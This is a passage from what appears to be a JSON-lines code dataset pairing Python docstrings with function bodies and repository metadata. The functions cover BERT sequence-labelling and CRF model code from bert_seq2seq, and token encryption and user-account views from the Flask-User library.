target_size\uff0c\u624d\u80fd\u786e\u5b9a\u9884\u6d4b\u591a\u5c11\u5206\u7c7b\")\n    bert_model = BertSeqLabelingCRF(word2ix, target_size, model_name=model_name)\n    return bert_model\nelif model_class == \"relation_extrac\":\n    if target_size == 0:\n        raise Exception(\"\u5fc5\u987b\u4f20\u5165\u53c2\u6570 target_size \u8868\u793a\u9884\u6d4bpredicate\u7684\u79cd\u7c7b\")\n    bert_model = BertRelationExtrac(word2ix, target_size, model_name=model_name)\n    return bert_model\nelse :\n    raise Exception(\"model_name_err\")", "path": "bert_seq2seq/bert_seq2seq/utils.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "# subject_labels: (lens, 2)\n", "func_signal": "def search_subject(token_ids, subject_labels):\n", "code": "if type(subject_labels) is torch.Tensor:\n    subject_labels = subject_labels.numpy()\nif type(token_ids) is torch.Tensor:\n    token_ids = token_ids.cpu().numpy()\nsubjects = []\nsubject_ids = []\nstart = -1\nend = -1\nfor i in range(len(token_ids)):\n    if subject_labels[i, 0] > 0.5:\n        start = i\n        for j in range(len(token_ids)):\n            if subject_labels[j, 1] > 0.5:\n                subject_labels[j, 1] = 0\n                end = j\n                break\n        if start == -1 or end == -1:\n            continue\n        subject = \"\"\n        for k in range(start, end + 1):\n            subject += idx2word[token_ids[k]]\n        # print(subject)\n        subject_ids.append([start, end])\n        start = -1\n        end = -1\n        subjects.append(subject)\n\nreturn subjects, subject_ids", "path": "bert_seq2seq/test/relation_extract_test.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97\u72b6\u6001\u6807\u7b7e\u5f97\u5206 + \u8f6c\u79fb\u6807\u7b7e\u5f97\u5206\ny_true: (batch, seq_len, out_dim)\ny_pred: (batch, seq_len, out_dim)\n\"\"\"\n# print(y_pred.shape)\n# print(y_true.shape)\n", "func_signal": "def target_score(self, y_pred, y_true):\n", "code": "point_score = torch.einsum(\"bni,bni->b\", y_pred, y_true)\ntrans_score = torch.einsum(\"bni,ij,bnj->b\", y_true[:, :-1], self.trans, y_true[:, 1: ])\n\nreturn point_score + trans_score", "path": "bert_seq2seq/bert_seq2seq/model/crf.py", "commit_date": "2020-06-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\nbeam-search\u64cd\u4f5c\n\"\"\"\n", "func_signal": "def beam_search(self, token_ids, token_type_ids, word2ix, beam_size=1, device=\"cpu\"):\n", "code": "sep_id = word2ix[\"[SEP]\"]\n\n# \u7528\u6765\u4fdd\u5b58\u8f93\u51fa\u5e8f\u5217\noutput_ids = torch.empty(1, 0, device=device, dtype=torch.long)\n# \u7528\u6765\u4fdd\u5b58\u7d2f\u8ba1\u5f97\u5206\n      \nwith torch.no_grad(): \n    output_scores = torch.zeros(token_ids.shape[0], device=device)\n    for step in range(self.out_max_length):\n        if step == 0:\n            scores = self.forward(token_ids, token_type_ids, device=device)\n            # \u91cd\u590dbeam-size\u6b21 \u8f93\u5165ids\n            token_ids = token_ids.view(1, -1).repeat(beam_size, 1)\n            token_type_ids = token_type_ids.view(1, -1).repeat(beam_size, 1)\n        else:\n            scores = self.forward(new_input_ids, new_token_type_ids, device=device)\n        \n        logit_score = torch.log_softmax(scores[:, -1], dim=-1)\n        \n        logit_score = output_scores.view(-1, 1) + logit_score # \u7d2f\u8ba1\u5f97\u5206\n        ## \u53d6topk\u7684\u65f6\u5019\u6211\u4eec\u662f\u5c55\u5e73\u4e86\u7136\u540e\u518d\u53bb\u8c03\u7528topk\u51fd\u6570\n        # \u5c55\u5e73\n        logit_score = logit_score.view(-1)\n        hype_score, hype_pos = torch.topk(logit_score, beam_size)\n        indice1 = (hype_pos // scores.shape[-1]) # \u884c\u7d22\u5f15\n        indice2 = (hype_pos % scores.shape[-1]).long().reshape(-1, 1) # \u5217\u7d22\u5f15\n       \n        # \u66f4\u65b0\u5f97\u5206\n        output_scores = hype_score\n        output_ids = torch.cat([output_ids[indice1], indice2], dim=1).long()\n        new_input_ids = torch.cat([token_ids, output_ids], dim=1)\n        new_token_type_ids = torch.cat([token_type_ids, torch.ones_like(output_ids)], dim=1)\n\n        end_counts = (output_ids == sep_id).sum(1)  # \u7edf\u8ba1\u51fa\u73b0\u7684end\u6807\u8bb0\n        best_one = output_scores.argmax()\n        if end_counts[best_one] == 1:\n            # \u8bf4\u660e\u51fa\u73b0\u7ec8\u6b62\u4e86\uff5e\n            return output_ids[best_one][:-1]\n        else :\n            # \u4fdd\u7559\u672a\u5b8c\u6210\u90e8\u5206\n            flag = (end_counts < 1)  # \u6807\u8bb0\u672a\u5b8c\u6210\u5e8f\u5217\n            if not flag.all():  # \u5982\u679c\u6709\u5df2\u5b8c\u6210\u7684\n                token_ids = token_ids[flag]\n                token_type_ids = token_type_ids[flag]\n                new_input_ids = new_input_ids[flag]\n                new_token_type_ids = new_token_type_ids[flag]\n                output_ids = output_ids[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                output_scores = output_scores[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                end_counts = end_counts[flag]  # \u6254\u6389\u5df2\u5b8c\u6210end\u8ba1\u6570\n                beam_size = flag.sum()  # topk\u76f8\u5e94\u53d8\u5316\n    \n    return output_ids[output_scores.argmax()]", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "# We \"pool\" the model by simply taking the hidden state corresponding\n# to the first token.\n", "func_signal": "def forward(self, hidden_states):\n", "code": "first_token_tensor = hidden_states[:, 0]\npooled_output = self.dense(first_token_tensor)\npooled_output = self.activation(pooled_output)\nreturn pooled_output", "path": "bert_seq2seq/bert_seq2seq/model/roberta_model.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"Construct a layernorm module in the TF style (epsilon inside the square root).\n\"\"\"\n", "func_signal": "def __init__(self, hidden_size, eps=1e-12, conditional=False):\n", "code": "super(BertLayerNorm, self).__init__()\nself.weight = nn.Parameter(torch.ones(hidden_size))\nself.bias = nn.Parameter(torch.zeros(hidden_size))\nself.variance_epsilon = eps\nself.conditional = conditional\nif conditional == True:\n    #\u8bf4\u660e\u662f\u6761\u4ef6 ln\n    self.weight_dense = nn.Linear(2 * hidden_size, hidden_size, bias=False)\n    self.weight_dense.weight.data.uniform_(0, 0)\n    self.bias_dense = nn.Linear(2 * hidden_size, hidden_size, bias=False)\n    self.bias_dense.weight.data.uniform_(0, 0)", "path": "bert_seq2seq/bert_seq2seq/model/roberta_model.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97loss\npredictions: (batch_size, 1)\n\"\"\"\n", "func_signal": "def compute_loss(self, predictions, labels):\n", "code": "predictions = predictions.view(-1, self.target_size)\nlabels = labels.view(-1)\nself.target_mask = self.target_mask.view(-1)\nloss = nn.CrossEntropyLoss(reduction=\"none\")\nreturn (loss(predictions, labels) * self.target_mask).sum() / self.target_mask.sum()", "path": "bert_seq2seq/bert_seq2seq/bert_seq_labeling.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\ny_true: [[1, 2, 3], [2, 3, 0] ]\nmask: [[1, 1, 1], [1, 1, 0]]\n\"\"\"\n", "func_signal": "def forward(self, y_pred, y_true, mask):\n", "code": "if y_pred.shape[0] != mask.shape[0] or y_pred.shape[1] != mask.shape[1]:\n    raise Exception(\"mask shape is not match to y_pred shape\")\nmask = mask.reshape((mask.shape[0], mask.shape[1], 1))\nmask = mask.float()\ny_true = y_true.reshape(y_pred.shape[:-1])\ny_true = y_true.long()  \ny_true_onehot = F.one_hot(y_true, self.output_dim) \ny_true_onehot = y_true_onehot.float()\n\nreturn self.compute_loss(y_pred, y_true_onehot, mask)", "path": "bert_seq2seq/bert_seq2seq/model/crf.py", "commit_date": "2020-06-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97loss\n\"\"\"\n", "func_signal": "def compute_loss(self, predictions, labels):\n", "code": "loss = self.crf_layer(predictions, labels, self.target_mask)\n\nreturn loss.mean()", "path": "bert_seq2seq/bert_seq2seq/bert_seq_labeling_crf.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97CRF\u635f\u5931\n\"\"\"\n", "func_signal": "def compute_loss(self, y_pred, y_true, mask):\n", "code": "y_pred = y_pred * mask\ny_true = y_true * mask\ntarget_score = self.target_score(y_pred, y_true)\nlog_norm = self.log_norm_step(y_pred, mask)\nlog_norm = self.logsumexp(log_norm, dim=1)# \u8ba1\u7b97\u6807\u91cf\nreturn log_norm - target_score", "path": "bert_seq2seq/bert_seq2seq/model/crf.py", "commit_date": "2020-06-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"Check config settings and initialize the Fernet encryption cypher.\n\nFernet is basically AES128 in CBC mode, with a timestamp and a signature.\n\nArgs:\n    app(Flask): The Flask application instance.\n\"\"\"\n\n", "func_signal": "def __init__(self, app):\n", "code": "self.app = app\n\n# Use the applications's SECRET_KEY if flask_secret_key is not specified.\nflask_secret_key = app.config.get('SECRET_KEY', None)\nif not flask_secret_key:\n    raise ConfigError('Config setting SECRET_KEY is missing.')\n\n# Print a warning if SECRET_KEY is too short\nkey = flask_secret_key.encode()\nif len(key)<32:\n    print('WARNING: Flask-User TokenManager: SECRET_KEY is shorter than 32 bytes.')\n    key = key + b' '*32    # Make sure the key is at least 32 bytes long\n\nkey32 = key[:32]\nbase64_key32 = base64.urlsafe_b64encode(key32)\n\n# Create a Fernet cypher to encrypt data -- basically AES128 in CBC mode,\n# Encrypt, timestamp, sign, and base64-encode\nfrom cryptography.fernet import Fernet\nself.fernet = Fernet(base64_key32)", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\"Decodes a concatenated string into a list of integers and strings.\n\nExample:\n    ``decode_data_items('abc|~B7|xyz')`` returns ``['abc', 123, 'xyz']``\n\"\"\"\n\n", "func_signal": "def decode_data_items(self, concatenated_str):\n", "code": "data_items = []\nstr_list = concatenated_str.split(self.SEPARATOR)\nfor str in str_list:\n\n    # '~base-64-strings' are decoded into integers.\n    if len(str)>=1 and str[0]==self.INTEGER_PREFIX:\n        item = self.decode_int(str[1:])\n\n    # Strings are decoded as-is.\n    else:\n        item = str\n\n    data_items.append(item)\n\n# Return list of data items\nreturn data_items", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Perform action 'action' on UserEmail object 'id'\n\"\"\"\n\n# Retrieve UserEmail by id\n", "func_signal": "def email_action_view(self, id, action):\n", "code": "user_email = self.db_manager.get_user_email_by_id(id=id)\n\n# Users may only change their own UserEmails\nif not user_email or user_email.user_id != current_user.id:\n    return self.unauthorized_view()\n\n# Delete UserEmail\nif action == 'delete':\n    # Primary UserEmail can not be deleted\n    if user_email.is_primary:\n        return self.unauthorized_view()\n    # Delete UserEmail\n    self.db_manager.delete_object(user_email)\n    self.db_manager.commit()\n\n# Set UserEmail.is_primary\nelif action == 'make-primary':\n    # Disable previously primary emails\n    user_emails = self.db_manager.find_user_emails(current_user)\n    for other_user_email in user_emails:\n        if other_user_email.is_primary:\n            other_user_email.is_primary=False\n            self.db_manager.save_object(other_user_email)\n    # Enable current primary email\n    user_email.is_primary=True\n    self.db_manager.save_object(user_email)\n    self.db_manager.commit()\n\n# Send confirm email\nelif action == 'confirm':\n    self._send_confirm_email_email(user_email.user, user_email)\nelse:\n    return self.unauthorized_view()\n\nreturn redirect(url_for('user.manage_emails'))", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Verify email confirmation token and activate the user account.\"\"\"\n# Verify token\n", "func_signal": "def confirm_email_view(self, token):\n", "code": "data_items = self.token_manager.verify_token(\n    token,\n    self.USER_CONFIRM_EMAIL_EXPIRATION)\n\n# Retrieve user, user_email by ID\nuser = None\nuser_email = None\nif data_items:\n    user, user_email = self.db_manager.get_user_and_user_email_by_id(data_items[0])\n\nif not user or not user_email:\n    flash(_('Invalid confirmation token.'), 'error')\n    return redirect(url_for('user.login'))\n\n# Set UserEmail.email_confirmed_at\nuser_email.email_confirmed_at=datetime.utcnow()\nself.db_manager.save_user_and_user_email(user, user_email)\nself.db_manager.commit()\n\n# Send confirmed_email signal\nsignals.user_confirmed_email.send(current_app._get_current_object(), user=user)\n\n# Flash a system message\nflash(_('Your email has been confirmed.'), 'success')\n\n# Auto-login after confirm or redirect to login page\nsafe_next_url = self._get_safe_next_url('next', self.USER_AFTER_CONFIRM_ENDPOINT)\nif self.USER_AUTO_LOGIN_AFTER_CONFIRM:\n    return self._do_login_user(user, safe_next_url)  # auto-login\nelse:\n    return redirect(url_for('user.login') + '?next=' + quote(safe_next_url))  # redirect to login page", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "# User must have been authenticated\n", "func_signal": "def _do_login_user(self, user, safe_next_url, remember_me=False):\n", "code": "if not user: return self.unauthenticated()\n\n# Check if user account has been disabled\nif not user.active:\n    flash(_('Your account has not been enabled.'), 'error')\n    return redirect(url_for('user.login'))\n\n# Check if user has a confirmed email address\nif self.USER_ENABLE_EMAIL \\\n        and self.USER_ENABLE_CONFIRM_EMAIL \\\n        and not current_app.user_manager.USER_ALLOW_LOGIN_WITHOUT_CONFIRMED_EMAIL \\\n        and not self.db_manager.user_has_confirmed_email(user):\n    url = url_for('user.resend_email_confirmation')\n    flash(_('Your email address has not yet been confirmed. Check your email Inbox and Spam folders for the confirmation email or <a href=\"%(url)s\">Re-send confirmation email</a>.', url=url), 'error')\n    return redirect(url_for('user.login'))\n\n# Use Flask-Login to sign in user\n# print('login_user: remember_me=', remember_me)\nlogin_user(user, remember=remember_me)\n\n# Send user_logged_in signal\nsignals.user_logged_in.send(current_app._get_current_object(), user=user)\n\n# Flash a system message\nflash(_('You have signed in successfully.'), 'success')\n\n# Redirect to 'next' URL\nreturn redirect(safe_next_url)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Prepare a Flash message and redirect to USER_UNAUTHENTICATED_ENDPOINT\"\"\"\n# Prepare Flash message\n", "func_signal": "def unauthenticated_view(self):\n", "code": "url = request.url\nflash(_(\"You must be signed in to access '%(url)s'.\", url=url), 'error')\n\n# Redirect to USER_UNAUTHENTICATED_ENDPOINT\nsafe_next_url = self.make_safe_url(url)\nreturn redirect(self._endpoint_url(self.USER_UNAUTHENTICATED_ENDPOINT)+'?next='+quote(safe_next_url))", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\"Prepare and process the login form.\"\"\"\n\n# Authenticate username/email and login authenticated users.\n\n", "func_signal": "def login_view(self):\n", "code": "safe_next_url = self._get_safe_next_url('next', self.USER_AFTER_LOGIN_ENDPOINT)\nsafe_reg_next = self._get_safe_next_url('reg_next', self.USER_AFTER_REGISTER_ENDPOINT)\n\n# Immediately redirect already logged in users\nif self.call_or_get(current_user.is_authenticated) and self.USER_AUTO_LOGIN_AT_LOGIN:\n    return redirect(safe_next_url)\n\n# Initialize form\nlogin_form = self.LoginFormClass(request.form)  # for login.html\nregister_form = self.RegisterFormClass()  # for login_or_register.html\nif request.method != 'POST':\n    login_form.next.data = register_form.next.data = safe_next_url\n    login_form.reg_next.data = register_form.reg_next.data = safe_reg_next\n\n# Process valid POST\nif request.method == 'POST' and login_form.validate():\n    # Retrieve User\n    user = None\n    user_email = None\n    if self.USER_ENABLE_USERNAME:\n        # Find user record by username\n        user = self.db_manager.find_user_by_username(login_form.username.data)\n\n        # Find user record by email (with form.username)\n        if not user and self.USER_ENABLE_EMAIL:\n            user, user_email = self.db_manager.get_user_and_user_email_by_email(login_form.username.data)\n    else:\n        # Find user by email (with form.email)\n        user, user_email = self.db_manager.get_user_and_user_email_by_email(login_form.email.data)\n\n    if user:\n        # Log user in\n        safe_next_url = self.make_safe_url(login_form.next.data)\n        return self._do_login_user(user, safe_next_url, login_form.remember_me.data)\n\n# Render form\nself.prepare_domain_translations()\ntemplate_filename = self.USER_LOGIN_AUTH0_TEMPLATE if self.USER_ENABLE_AUTH0 else self.USER_LOGIN_TEMPLATE\nreturn render_template(template_filename,\n              form=login_form,\n              login_form=login_form,\n              register_form=register_form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Prompt for new username and old password and change the user's username.\"\"\"\n\n# Initialize form\n", "func_signal": "def change_username_view(self):\n", "code": "form = self.ChangeUsernameFormClass(request.form)\n\n# Process valid POST\nif request.method == 'POST' and form.validate():\n\n    # Change username\n    new_username = form.new_username.data\n    current_user.username=new_username\n    self.db_manager.save_object(current_user)\n    self.db_manager.commit()\n\n    # Send username_changed email\n    if self.USER_ENABLE_EMAIL and self.USER_SEND_USERNAME_CHANGED_EMAIL:\n        self.email_manager.send_username_changed_email(current_user)\n\n    # Send changed_username signal\n    signals.user_changed_username.send(current_app._get_current_object(), user=current_user)\n\n    # Flash a system message\n    flash(_(\"Your username has been changed to '%(username)s'.\", username=new_username), 'success')\n\n    # Redirect to 'next' URL\n    safe_next_url = self._get_safe_next_url('next', self.USER_AFTER_CHANGE_USERNAME_ENDPOINT)\n    return redirect(safe_next_url)\n\n# Render form\nself.prepare_domain_translations()\nreturn render_template(self.USER_CHANGE_USERNAME_TEMPLATE, form=form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Encodes an integer into a short Base64 string.\n\nExample:\n    ``encode_int(123)`` returns ``'B7'``.\n\"\"\"\n", "func_signal": "def encode_int(self, n):\n", "code": "str = []\nwhile True:\n    n, r = divmod(n, self.BASE)\n    str.append(self.ALPHABET[r])\n    if n == 0: break\nreturn ''.join(reversed(str))", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\"Prompt for email and send reset password email.\"\"\"\n\n# Initialize form\n", "func_signal": "def forgot_password_view(self):\n", "code": "form = self.ForgotPasswordFormClass(request.form)\n\n# Process valid POST\nif request.method == 'POST' and form.validate():\n    # Get User and UserEmail by email\n    email = form.email.data\n    user, user_email = self.db_manager.get_user_and_user_email_by_email(email)\n\n    if user and user_email:\n        # Send reset_password email\n        self.email_manager.send_reset_password_email(user, user_email)\n\n        # Send forgot_password signal\n        signals.user_forgot_password.send(current_app._get_current_object(), user=user)\n\n    # Flash a system message\n    flash(_(\n        \"A reset password email has been sent to '%(email)s'. Open that email and follow the instructions to reset your password.\",\n        email=email), 'success')\n\n    # Redirect to the login page\n    return redirect(self._endpoint_url(self.USER_AFTER_FORGOT_PASSWORD_ENDPOINT))\n\n# Render form\nself.prepare_domain_translations()\nreturn render_template(self.USER_FORGOT_PASSWORD_TEMPLATE, form=form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\"Timestamp, sign and encrypt a string into a token using ``cryptography.fernet.Fernet()``.\"\"\"\n\n# Convert string to bytes\n", "func_signal": "def encrypt_string(self, concatenated_str):\n", "code": "concatenated_bytes = concatenated_str.encode()\n\n# Encrypt, timestamp, sign, and base64-encode\nencrypted_bytes = self.fernet.encrypt(concatenated_bytes)\n\n# Convert bytes to string\nencrypted_str = encrypted_bytes.decode('utf-8')\n\n# Remove '=' padding if needed\ntoken_str = encrypted_str.strip('=')\nreturn token_str", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Encodes a list of integers and strings into a concatenated string.\n\n- encode string items as-is.\n- encode integer items as base-64 with a ``'~'`` prefix.\n- concatenate encoded items with a ``'|'`` separator.\n\nExample:\n    ``encode_data_items('abc', 123, 'xyz')`` returns ``'abc|~B7|xyz'``\n\"\"\"\n", "func_signal": "def encode_data_items(self, *args):\n", "code": "str_list = []\nfor arg in args:\n\n    # encode string items as-is\n    if isinstance(arg, str):\n        arg_str = arg\n\n    # encode integer items as base-64 strings with a '~' character in front\n    elif isinstance(arg, int):\n        arg_str = self.INTEGER_PREFIX + self.encode_int(arg)\n\n    # convert other types to string\n    else:\n        arg_str = str(arg)\n\n    str_list.append(arg_str)\n\n# Concatenate strings with '|' separators\nconcatenated_str = self.SEPARATOR.join(str_list)\n\nreturn concatenated_str", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Display registration form and create new User.\"\"\"\n\n", "func_signal": "def register_view(self):\n", "code": "safe_next_url = self._get_safe_next_url('next', self.USER_AFTER_LOGIN_ENDPOINT)\nsafe_reg_next_url = self._get_safe_next_url('reg_next', self.USER_AFTER_REGISTER_ENDPOINT)\n\n# Initialize form\nlogin_form = self.LoginFormClass()  # for login_or_register.html\nregister_form = self.RegisterFormClass(request.form)  # for register.html\n\n# invite token used to determine validity of registeree\ninvite_token = request.values.get(\"token\")\n\n# require invite without a token should disallow the user from registering\nif self.USER_REQUIRE_INVITATION and not invite_token:\n    flash(\"Registration is invite only\", \"error\")\n    return redirect(url_for('user.login'))\n\nuser_invitation = None\nif invite_token and self.db_manager.UserInvitationClass:\n    data_items = self.token_manager.verify_token(invite_token, self.USER_INVITE_EXPIRATION)\n    if data_items:\n        user_invitation_id = data_items[0]\n        user_invitation = self.db_manager.get_user_invitation_by_id(user_invitation_id)\n\n    if not user_invitation:\n        flash(\"Invalid invitation token\", \"error\")\n        return redirect(url_for('user.login'))\n\n    register_form.invite_token.data = invite_token\n\nif request.method != 'POST':\n    login_form.next.data = register_form.next.data = safe_next_url\n    login_form.reg_next.data = register_form.reg_next.data = safe_reg_next_url\n    if user_invitation:\n        register_form.email.data = user_invitation.email\n\n# Process valid POST\nif request.method == 'POST' and register_form.validate():\n    user = self.db_manager.add_user()\n    register_form.populate_obj(user)\n    user_email = self.db_manager.add_user_email(user=user, is_primary=True)\n    register_form.populate_obj(user_email)\n\n    # Store password hash instead of password\n    user.password = self.hash_password(user.password)\n\n    # Email confirmation depends on the USER_ENABLE_CONFIRM_EMAIL setting\n    request_email_confirmation = self.USER_ENABLE_CONFIRM_EMAIL\n    # Users that register through an invitation, can skip this process\n    # but only when they register with an email that matches their invitation.\n    if user_invitation:\n        if user_invitation.email.lower() == register_form.email.data.lower():\n            user_email.email_confirmed_at=datetime.utcnow()\n            request_email_confirmation = False\n\n    self.db_manager.save_user_and_user_email(user, user_email)\n    self.db_manager.commit()\n\n    # Send 'registered' email and delete new User object if send fails\n    if self.USER_SEND_REGISTERED_EMAIL:\n        try:\n            # Send 'confirm email' or 'registered' email\n            self._send_registered_email(user, user_email, request_email_confirmation)\n        except Exception as e:\n            # delete new User object if send  fails\n            self.db_manager.delete_object(user)\n            self.db_manager.commit()\n            raise\n\n    # Send user_registered signal\n    signals.user_registered.send(current_app._get_current_object(),\n                                 user=user,\n                                 user_invitation=user_invitation)\n\n    # Redirect if USER_ENABLE_CONFIRM_EMAIL is set\n    if self.USER_ENABLE_CONFIRM_EMAIL and request_email_confirmation:\n        safe_reg_next_url = self.make_safe_url(register_form.reg_next.data)\n        return redirect(safe_reg_next_url)\n\n    # Auto-login after register or redirect to login page\n    if 'reg_next' in request.args:\n        safe_reg_next_url = self.make_safe_url(register_form.reg_next.data)\n    else:\n        safe_reg_next_url = self._endpoint_url(self.USER_AFTER_CONFIRM_ENDPOINT)\n    if self.USER_AUTO_LOGIN_AFTER_REGISTER:\n        return self._do_login_user(user, safe_reg_next_url)  # auto-login\n    else:\n        return redirect(url_for('user.login') + '?next=' + quote(safe_reg_next_url))  # redirect to login page\n\n# Render form\nself.prepare_domain_translations()\nreturn render_template(self.USER_REGISTER_TEMPLATE,\n              form=register_form,\n              login_form=login_form,\n              register_form=register_form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Verify token signature, verify token expiration, and decrypt token.\n\n| Returns None if token is expired or invalid.\n| Returns a list of strings and integers on success.\n\nImplemented as::\n\n    concatenated_str = self.decrypt_string(token, expiration_in_seconds)\n    data_items = self.decode_data_items(concatenated_str)\n    return data_items\n\nExample:\n\n::\n\n    # Verify that a User with ``user_id`` has a password that ends in ``password_ends_with``.\n    token_is_valid = False\n    data_items = token_manager.verify(token, expiration_in_seconds)\n    if data_items:\n        user_id = data_items[0]\n        password_ends_with = data_items[1]\n        user = user_manager.db_manager.get_user_by_id(user_id)\n        token_is_valid = user and user.password[-8:]==password_ends_with\n\"\"\"\n\n", "func_signal": "def verify_token(self, token, expiration_in_seconds=None):\n", "code": "from cryptography.fernet import InvalidToken\n\ntry:\n    concatenated_str = self.decrypt_string(token, expiration_in_seconds)\n    data_items = self.decode_data_items(concatenated_str)\nexcept InvalidToken:\n    data_items = None\n\nreturn data_items", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\"Verify signature, verify timestamp, and decrypt a token using ``cryptography.fernet.Fernet()``.\"\"\"\n\n# Add '=' padding if needed\n", "func_signal": "def decrypt_string(self, token_str, expiration_in_seconds=None):\n", "code": "if len(token_str) % 4:\n    token_str += '=' * (4 - len(token_str) % 4)\n\n# Convert string to bytes\nencrypted_bytes = token_str.encode()\n\n# Verify signature, verify expiration, and decrypt using ``cryptography.fernet.Fernet()``\nconcatenated_bytes = self.fernet.decrypt(encrypted_bytes, expiration_in_seconds)\nconcatenated_str = concatenated_bytes.decode('utf-8')\n\nreturn concatenated_str", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Decodes a short Base64 string into an integer.\n\nExample:\n    ``decode_int('B7')`` returns ``123``.\n\"\"\"\n", "func_signal": "def decode_int(self, str):\n", "code": "n = 0\nfor c in str:\n    n = n * self.BASE + self.ALPHABET_REVERSE[c]\nreturn n", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "# Initialize form\n", "func_signal": "def edit_user_profile_view(self):\n", "code": "form = self.EditUserProfileFormClass(request.form, obj=current_user)\n\n# Process valid POST\nif request.method == 'POST' and form.validate():\n    # Update fields\n    form.populate_obj(current_user)\n\n    # Save object\n    self.db_manager.save_object(current_user)\n    self.db_manager.commit()\n\n    return redirect(self._endpoint_url(self.USER_AFTER_EDIT_USER_PROFILE_ENDPOINT))\n\n# Render form\nself.prepare_domain_translations()\nreturn render_template(self.USER_EDIT_USER_PROFILE_TEMPLATE, form=form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
